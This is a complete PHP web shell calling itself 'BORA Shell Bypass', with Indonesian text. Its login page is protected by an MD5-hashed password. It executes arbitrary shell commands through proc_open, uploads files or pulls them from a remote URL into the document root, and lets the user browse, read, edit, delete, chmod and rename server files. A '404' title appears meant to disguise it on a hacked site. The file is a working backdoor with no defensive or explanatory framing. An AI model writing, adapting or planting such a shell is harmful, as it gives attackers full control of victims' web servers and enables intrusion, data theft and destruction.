<?php
session_start();
$password = "76fdd00d9db694259b003d95f9dd66cc";

function login_shell()
{
?>
    <html>
<head>
	<title>BORA</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_KDnK7xzfn9aOPlotx3cPJzlzJ7jakHWhKXodwynrBG6RMF551hP1rtVfO6ZKL4WvbJIuoO94fAWBurYsrI0bTJOuLycy0eHFm1t5XKX_vH9IA5OAa5aBBj3hYcF8nplIMkv_CvNJqO09LPuZL-WaFOP6X-694RHp6WHsEi3jhC7KJjxdQFCYgGuAvQk/s16000/images-removebg-preview.png" />
</head><l
<body>
<div class="login">
    <h2 class="login-header">
        BORA
    </h2>
    <form class="login-container" action="" method="post">
        <div align="center">
            <input type="Password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value="LOGIN">
          </div>
    </form>
</div>
</body>
</html>
<style>
body {
    background: rgb(87, 87, 87);
    font-family: 'Beautiful Vampires', sans-serif;
    background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglXXZa_THmxRuyE-SWD3d7wiAOCj02QZjFRhTbK01NIqGL1mI0OAdf8kSh5wNwBVPwefq7jPeHjcHI9xgWnpyRVdF4EP2NVpsWthA3pSowA7zsqbb50-Jguf2GT4Ar60x_4dyHQXGvbZQo25r5NiVXfCvcUH2Rbrd1yqqxNW0d32XbEBIWtI8qSpPKN2k/s16000/corey-mizunaga-finalbw.jpg);
  }
  .login {
    width: 400px;
    margin: 16px auto;
    font-size: 16px;
  }
  /* Reset top and bottom margins from certain elements */
  .login-header,
  .login p {
    margin-top: 0;
    margin-bottom: 0;
  }
  .login-header {
    background: #790000;
    padding: 20px;
    font-size: 1.4em;
    font-weight: normal;
    text-align: center;
    text-transform: uppercase;
    color: #fff;
    border: 2px solid #ffca2d;
  }
  .login-container {
    background: #2d2d2d;
    padding: 12px;
    border-radius: 10px 10px;
  }
  /* Every row inside .login-container is defined with p tags */
  .login p {
    padding: 12px;
  }
  .login input {
    box-sizing: border-box;
    display: block;
    width: 100%;
    border-width: 1px;
    border-style: solid;
    padding: 16px;
    outline: 0;
    font-family: inherit;
    font-size: 0.95em;
  }
  .login input[type="email"],
  .login input[type="password"] {
    background: #e9e9e9;
    border-color: #bbb;
    color: #555;
  }
  /* Text fields' focus effect */
  .login input[type="email"]:focus,
  .login input[type="password"]:focus {
    border-color: #888;
  }
  .login input[type="submit"] {
    background: #790000;
    border-color: transparent;
    color: #fff;
    cursor: pointer;
    border: 2px solid #ffca2d;
    border-radius: 5px 5px;
  }
  .login input[type="submit"]:hover {
    background: #17c;
  }
  /* Buttons' focus effect */
  .login input[type="submit"]:focus {
    border-color: #05a;
  }
</style>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<html>

  <title>BORA</title>
  <style>
        body {
            color: red;
            background-size: cover !important;
            background-attachment: fixed !important;
            background-position-x: center !important;
            background-position-y: center !important;
        }
    </style>
</head>
<body>
  <br></br>
  <center><h1>BORA 404</h1></center>
</body>
<form method="post">
<font face=courier new size=4>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="ls -la" style="margin: 5px auto; padding-left: 5px;" required><br>
<button type="submit">Execute</button>
</form><hr>
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "r") // stderr is a file to write to
);
$env = array('some_option' => 'aeiou');
$meki = "";
if(isset($_POST['cmd'])){ 
$cmd = ($_POST['cmd']);
echo "<table width=100%><td><textarea cols=90 rows=25>";
$process = proc_open($cmd, $descriptorspec, $pipes, $meki, $env);
echo stream_get_contents($pipes[1]); die; }
?>

</script> <div id="app"> <g size="1px">BORA</h1> <span class="sub">Uploader :</span> <?php $uploadd = $_FILES['file']['tmp_name']; if (file_exists($uploadd)) { $pwddir = $_POST['dir']; $real = $_FILES['file']['name']; $de = $pwddir."/".$real; copy($uploadd, $de); echo "File berhasil di upload sayang ^_^ $de"; } ?> <form method="post" enctype="multipart/form-data"> <input type="text" name="dir" size="30" value="<? echo getcwd(); ?>"> <input type="file" name="file" size="15"> <input type="submit" value="Upload"> </form> 
<!DOCTYPE html>
<html>
<?php

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>BORA Shell Bypass</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['path'])) {
		$lokasi = $_GET['path'];
	} else {
		$lokasi = getcwd();
	}
	if (is_writable($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function cekroot() {
	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}
echo "Directory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
	$lokasi = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$lokasi = getcwd();
	$lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
			echo "<font color='red'>File gagal di upload, Jangan marah ya :)<br><br>";
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			exit("Filename cannot be empty !");
		}
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File sukses di upload sayang ^_^ &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
			echo "<font coloe='red'>Failed to Upload !<br><br>";
		}
	}
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://example.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';

if (isset($_GET['fileloc'])) {
	echo "<tr><td>Current File : ".$_GET['fileloc'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
	author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
	if (is_dir($_POST['path'])) {
		xrmdir($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
			echo "string";
		}
	} elseif (is_file($_POST['path'])) {
		@unlink($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
	if (isset($_POST['chm0d'])) {
		$cm = @chmod($_POST['path'], $_POST['perm']);
		if ($cm == true) {
			green("Change Mod Success !");
		} else {
			red("Change Mod Failed !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
	if (isset($_POST['gantin'])) {
		$ren = @rename($_POST['path'], $_POST['newname']);
		if ($ren == true) {
			green("Change Name Success !");
		} else {
			red("Change Name Failed !");
		}
	}
	if (empty($_POST['name'])) {
		$namaawal = $_POST['newname'];
	} else {
		$namawal = $_POST['name'];
	}
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @file_put_contents($_POST['path'], $_POST['src']);
		if ($edit == true) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>".$_POST['path']."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
	echo "<tr>
	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
	echo statusnya($lokasi."/".$dir);
	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
	if(!is_file("$lokasi/$file")) continue;
	$size = filesize("$lokasi/$file")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>